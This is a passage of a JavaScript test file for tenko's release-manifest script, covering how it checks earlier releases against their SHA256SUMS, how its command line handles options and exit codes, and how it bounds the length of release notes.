    const badSize = entry("0.1.0");
    badSize.assets[0] = { ...badSize.assets[0], size: -1 };
    const otherVersion = entry("0.1.0");
    otherVersion.assets[0] = { ...otherVersion.assets[0], name: "tenko-0.0.9-linux-x86_64", url: `${DOWNLOAD_URL}/v0.1.0/tenko-0.0.9-linux-x86_64` };
    for (const [bad, reason] of [[wrongPlatform, /platform/], [wrongKind, /"exe"/], [badDigest, /lowercase hexadecimal/], [badSize, /size -1/], [otherVersion, /not a file of version 0\.1\.0/]]) {
      const { fetchText } = fetcher(sums);
      const result = await verifyPreviousReleases(manifest([bad]), options(fetchText));
      assert.deepEqual(result.previous.releases, []);
      assert.match(result.dropped[0]?.reason ?? "", /** @type {RegExp} */ (reason));
    }
    const { fetchText } = fetcher(sums);
    const noImage = await verifyPreviousReleases(manifest([entry("0.1.0", { image: "ghcr.io/linkztream/tenko:0.1.0" })]), options(fetchText, { image: undefined }));
    assert.match(noImage.dropped[0]?.reason ?? "", /this release has no image/);
  });

  test("the entry of the version being released is not checked: it is replaced", async () => {
    const { fetchText, requested } = fetcher({});
    const result = await verifyPreviousReleases(manifest([entry("0.2.0")]), options(fetchText, { skipVersion: "0.2.0" }));
    assert.equal(result.previous.releases.length, 1);
    assert.deepEqual(requested, []);
  });

  test("refuses a manifest of another schema or a broken release, like mergeManifest", async () => {
    const { fetchText } = fetcher({});
    await assert.rejects(verifyPreviousReleases({ schema: 2, project: "tenko", releases: [] }, options(fetchText)), ManifestError);
    await assert.rejects(verifyPreviousReleases(manifest([{ notes: "no version" }]), options(fetchText)), /without a valid version/);
  });
});

// ---------------------------------------------------------------------------------------
// The command line

/**
 * @param {string[]} args
 * @param {string} [cwd]
 */
function cli(args, cwd = here) {
  const r = spawnSync(process.execPath, [script, ...args], { cwd, encoding: "utf8" });
  return { status: r.status, stdout: r.stdout, stderr: r.stderr };
}

/**
 * Like cli, without blocking the event loop, for the tests that serve a file to the script.
 * @param {string[]} args
 * @returns {Promise<{ status: number | null, stdout: string, stderr: string }>}
 */
function cliAsync(args) {
  return new Promise((resolve) => {
    execFile(process.execPath, [script, ...args], { cwd: here, encoding: "utf8" }, (error, stdout, stderr) => {
      resolve({ status: error === null ? 0 : /** @type {{ code?: number }} */ (error).code ?? null, stdout, stderr });
    });
  });
}

describe("command line", () => {
  test("writes releases.json and SHA256SUMS next to it", async () => {
    await withTempDir((dir) => {
      const assets = path.join(dir, "dist");
      mkdirSync(assets);
      writeFiles(assets, {
        "tenko-0.2.0-linux-x86_64": "linux binary",
        "tenko-0.2.0-windows-x86_64.exe": "windows binary",
        "notes.md": "ignored",
      });
      const changelog = path.join(dir, "CHANGELOG.md");
      writeFileSync(changelog, CHANGELOG);
      const out = path.join(dir, "out", "nested", "releases.json");

      const r = cli([
        "--version", "0.2.0",
        "--assets", assets,
        "--base-url", BASE_URL,
        "--changelog", changelog,
        "--image", "ghcr.io/linkztream/tenko:0.2.0",
        "--format", "1",
        "--out", out,
      ]);
      assert.equal(r.status, 0, r.stderr);
      assert.match(r.stdout, /ignored notes\.md/);
      assert.match(r.stdout, /release 0\.2\.0, 2 assets, 1 release in the manifest/);

      const text = readFileSync(out, "utf8");
      assert.ok(text.endsWith("}\n"));
      assert.ok(text.startsWith('{\n  "schema": 1,\n  "project": "tenko",\n  "releases": [\n    {\n'));
      const manifest = JSON.parse(text);
      assert.equal(manifest.schema, 1);
      assert.equal(manifest.project, "tenko");
      assert.equal(manifest.releases.length, 1);
      const release = manifest.releases[0];
      assert.equal(release.version, "0.2.0");
      assert.equal(release.format, 1);
      assert.equal(release.image, "ghcr.io/linkztream/tenko:0.2.0");
      assert.deepEqual(
        release.assets.map((/** @type {any} */ a) => [a.platform, a.name, a.url, a.sha256, a.size]),
        [
          ["linux-x86_64", "tenko-0.2.0-linux-x86_64", `${BASE_URL}/tenko-0.2.0-linux-x86_64`, sha256("linux binary"), 12],
          ["windows-x86_64", "tenko-0.2.0-windows-x86_64.exe", `${BASE_URL}/tenko-0.2.0-windows-x86_64.exe`, sha256("windows binary"), 14],
        ],
      );

      const sums = readFileSync(path.join(path.dirname(out), "SHA256SUMS"), "utf8");
      assert.equal(
        sums,
        `${sha256(text)}  releases.json\n${sha256("linux binary")}  tenko-0.2.0-linux-x86_64\n${sha256("windows binary")}  tenko-0.2.0-windows-x86_64.exe\n`,
      );
      assert.match(r.stdout, /SHA256SUMS: 3 checksums/);
    });
  });

  /**
   * Serves `files` by path for the check of earlier releases; `body` gets the download URL.
   * @template T
   * @param {Record<string, string>} files
   * @param {(downloadUrl: string, requested: string[]) => Promise<T>} body
   */
  async function withSumsServer(files, body) {
    /** @type {string[]} */
    const requested = [];
    const server = createServer((req, res) => {
      requested.push(req.url ?? "");
      const text = files[req.url ?? ""];
      if (text === undefined) {
        res.writeHead(404).end("Not Found");
      } else {
        res.writeHead(200, { "content-type": "text/plain" }).end(text);
      }
    });
    await new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(undefined)));
    const address = /** @type {import("node:net").AddressInfo} */ (server.address());
    try {
      return await body(`http://127.0.0.1:${address.port}/download`, requested);
    } finally {
      server.close();
    }
  }

  test("merges --previous after checking each earlier release against its SHA256SUMS, and rewrites it in place", async () => {
    await withTempDir(async (dir) => {
      const assets = path.join(dir, "dist");
      mkdirSync(assets);
      writeFiles(assets, { "tenko-0.2.0-linux-x86_64": "v2" });
      const changelog = path.join(dir, "CHANGELOG.md");
      writeFileSync(changelog, `${CHANGELOG}
## [0.0.9] - 2026-09-01

### Fixed

- A fix.
`);
      const out = path.join(dir, "releases.json");
      const old = (/** @type {string} */ version, /** @type {string} */ digest, /** @type {string} */ [base] = ["https://github.com/linkztream/tenko/releases/download"]) => ({
        version,
        date: "2026-01-01",
        notes: "old",
        security: false,
        requires_action: false,
        assets: [{ platform: "linux-x86_64", name: `tenko-${version}-linux-x86_64`, url: `${base}/v${version}/tenko-${version}-linux-x86_64`, sha256: digest, size: 1 }],
      });
      await withSumsServer(
        {
          "/download/v0.1.0/SHA256SUMS": `${sha256("v1")}  tenko-0.1.0-linux-x86_64\n`,
          "/download/v0.0.9/SHA256SUMS": `${sha256("v0.9")}  tenko-0.0.9-linux-x86_64\n`,
        },
        async (downloadUrl, requested) => {
          // The entry of 0.0.9 is planted: its digest is not the one that release published.
          writeFileSync(out, formatManifest({ schema: 1, project: "tenko", releases: [old("0.2.0", sha256("stale")), old("0.1.0", sha256("v1"), [downloadUrl]), old("0.0.9", sha256("planted"), [downloadUrl])] }));
          const r = await cliAsync(["--version", "0.2.0", "--assets", assets, "--base-url", BASE_URL, "--changelog", changelog, "--previous", out, "--verify-previous", downloadUrl, "--out", out]);
          assert.equal(r.status, 0, r.stderr);
          assert.match(r.stdout, /2 releases in the manifest, 1 earlier release dropped/);
          assert.match(r.stderr, /warning: dropped release 0\.0\.9 from the manifest: .*tenko-0\.0\.9-linux-x86_64/);
          assert.ok(!r.stderr.includes("0.1.0"), r.stderr);
          assert.deepEqual(requested.sort(), ["/download/v0.0.9/SHA256SUMS", "/download/v0.1.0/SHA256SUMS"]);
          const manifest = JSON.parse(readFileSync(out, "utf8"));
          assert.deepEqual(manifest.releases.map((/** @type {any} */ x) => [x.version, x.notes]), [
            ["0.2.0", "### Added\n\n- Update notice.\n- Release manifest."],
            ["0.1.0", "### Added\n\n- First release."],
          ]);
        },
      );
    });
  });

  test("--previous without --verify-previous is a usage error, and a failing fetch exits 1", async () => {
    await withTempDir(async (dir) => {
      const assets = path.join(dir, "dist");
      mkdirSync(assets);
      writeFiles(assets, { "tenko-0.2.0-linux-x86_64": "v2" });
      const changelog = path.join(dir, "CHANGELOG.md");
      writeFileSync(changelog, CHANGELOG);
      const previous = path.join(dir, "previous.json");
      writeFileSync(previous, formatManifest({ schema: 1, project: "tenko", releases: [] }));
      const out = path.join(dir, "releases.json");
      const args = ["--version", "0.2.0", "--assets", assets, "--base-url", BASE_URL, "--changelog", changelog, "--previous", previous, "--out", out];
      const r = cli(args);
      assert.equal(r.status, 2);
      assert.match(r.stderr, /--verify-previous is required with --previous/);
      assert.equal(cli([...args, "--verify-previous", "ftp://example.com/x"]).status, 2);
      assert.throws(() => readFileSync(out), { code: "ENOENT" });

      const old = { version: "0.1.0", date: "2026-01-01", notes: "old", security: false, requires_action: false, assets: [{ platform: "linux-x86_64", name: "tenko-0.1.0-linux-x86_64", url: "", sha256: sha256("v1"), size: 1 }] };
      await withSumsServer({}, async (downloadUrl) => {
        old.assets[0].url = `${downloadUrl}/v0.1.0/tenko-0.1.0-linux-x86_64`;
        writeFileSync(previous, formatManifest({ schema: 1, project: "tenko", releases: [old] }));
        // A release without SHA256SUMS (404) drops the entry; the run goes on.
        const gone = await cliAsync([...args, "--verify-previous", downloadUrl]);
        assert.equal(gone.status, 0, gone.stderr);
        assert.match(gone.stderr, /warning: dropped release 0\.1\.0 .*404/);
        assert.match(gone.stdout, /1 release in the manifest, 1 earlier release dropped/);
      });
      // A server that cannot be reached stops the run.
      const server = createServer(() => {});
      await new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(undefined)));
      const port = /** @type {import("node:net").AddressInfo} */ (server.address()).port;
      await new Promise((resolve) => server.close(() => resolve(undefined)));
      old.assets[0].url = `http://127.0.0.1:${port}/download/v0.1.0/tenko-0.1.0-linux-x86_64`;
      writeFileSync(previous, formatManifest({ schema: 1, project: "tenko", releases: [old] }));
      const down = await cliAsync([...args, "--verify-previous", `http://127.0.0.1:${port}/download`]);
      assert.equal(down.status, 1);
      assert.match(down.stderr, /release-manifest: cannot fetch .*SHA256SUMS/);
    });
  });

  test("an unreadable --previous is an error and writes nothing", async () => {
    await withTempDir((dir) => {
      const assets = path.join(dir, "dist");
      mkdirSync(assets);
      writeFiles(assets, { "tenko-0.2.0-linux-x86_64": "x" });
      const changelog = path.join(dir, "CHANGELOG.md");
      writeFileSync(changelog, CHANGELOG);
      const out = path.join(dir, "releases.json");
      const args = ["--version", "0.2.0", "--assets", assets, "--base-url", BASE_URL, "--changelog", changelog, "--out", out, "--verify-previous", "https://example.com/download"];

      const missing = cli([...args, "--previous", path.join(dir, "nope.json")]);
      assert.equal(missing.status, 1);
      assert.match(missing.stderr, /cannot read the previous manifest/);

      writeFileSync(path.join(dir, "bad.json"), "{ not json");
      assert.equal(cli([...args, "--previous", path.join(dir, "bad.json")]).status, 1);
      writeFileSync(path.join(dir, "other.json"), '{"schema": 7, "project": "tenko", "releases": []}');
      const other = cli([...args, "--previous", path.join(dir, "other.json")]);
      assert.equal(other.status, 1);
      assert.match(other.stderr, /not a schema 1 manifest/);

      assert.throws(() => readFileSync(out), { code: "ENOENT" });
      assert.throws(() => readFileSync(path.join(dir, "SHA256SUMS")), { code: "ENOENT" });
    });
  });

  test("a version without a changelog section exits 1", async () => {
    await withTempDir((dir) => {
      const assets = path.join(dir, "dist");
      mkdirSync(assets);
      writeFiles(assets, { "tenko-0.5.0-linux-x86_64": "x" });
      const changelog = path.join(dir, "CHANGELOG.md");
      writeFileSync(changelog, CHANGELOG);
      const r = cli(["--version", "0.5.0", "--assets", assets, "--base-url", BASE_URL, "--changelog", changelog, "--out", path.join(dir, "releases.json")]);
      assert.equal(r.status, 1);
      assert.match(r.stderr, /release-manifest: the changelog has no section/);
    });
  });

  test("a changelog with a syntax error exits 1 with the line", async () => {
    await withTempDir((dir) => {
      const assets = path.join(dir, "dist");
      mkdirSync(assets);
      writeFiles(assets, { "tenko-0.2.0-linux-x86_64": "x" });
      const changelog = path.join(dir, "CHANGELOG.md");
      writeFileSync(changelog, "# Changelog\n\n## Broken\n");
      const r = cli(["--version", "0.2.0", "--assets", assets, "--base-url", BASE_URL, "--changelog", changelog, "--out", path.join(dir, "releases.json")]);
      assert.equal(r.status, 1);
      assert.match(r.stderr, /CHANGELOG line 3:/);
    });
  });

  test("missing or malformed options exit 2, --help exits 0", () => {
    assert.equal(cli([]).status, 2);
    assert.equal(cli(["--version", "0.2.0"]).status, 2);
    assert.equal(cli(["--version", "0.2.0", "--assets", "x"]).status, 2);
    assert.equal(cli(["--version", "0.2.0", "--assets", "x", "--base-url", "https://example.com", "--format", "0"]).status, 2);
    assert.equal(cli(["--version", "0.2.0", "--assets", "x", "--base-url", "https://example.com", "--format", "one"]).status, 2);
    assert.equal(cli(["--nope"]).status, 2);
    assert.equal(cli(["extra"]).status, 2);
    for (const flag of ["--help", "-h"]) {
      const r = cli([flag]);
      assert.equal(r.status, 0);
      assert.match(r.stdout, /^Usage: node scripts\/release-manifest\.mjs/);
    }
  });

  test("a missing assets directory exits 1", () => {
    const r = cli(["--version", "0.2.0", "--assets", path.join(os.tmpdir(), "tenko-no-such-dir"), "--base-url", BASE_URL, "--changelog", path.join(here, "..", "CHANGELOG.md")]);
    assert.equal(r.status, 1);
  });
});

describe("boundText", () => {
  test("leaves a text within the bound alone", () => {
    assert.equal(boundText("### Added\n\n- One.", MAX_NOTES_BYTES), "### Added\n\n- One.");
  });

  test("cuts a longer text at a line boundary and says where the rest is", () => {
    const line = "- An entry of some length to fill the notes.\n";
    const text = line.repeat(3000);
    const bounded = boundText(text, MAX_NOTES_BYTES);
    assert.ok(Buffer.byteLength(bounded, "utf8") <= MAX_NOTES_BYTES);
    assert.match(bounded, /\.\n\n\(The notes continue in CHANGELOG\.md of the repository\.\)$/);
    assert.ok(bounded.startsWith(line));
  });

  test("never splits a multi-byte character", () => {
    const text = "- ".concat("å".repeat(70000));
    const bounded = boundText(text, MAX_NOTES_BYTES);
    assert.ok(Buffer.byteLength(bounded, "utf8") <= MAX_NOTES_BYTES);
    assert.ok(!bounded.includes("�"));
  });
});
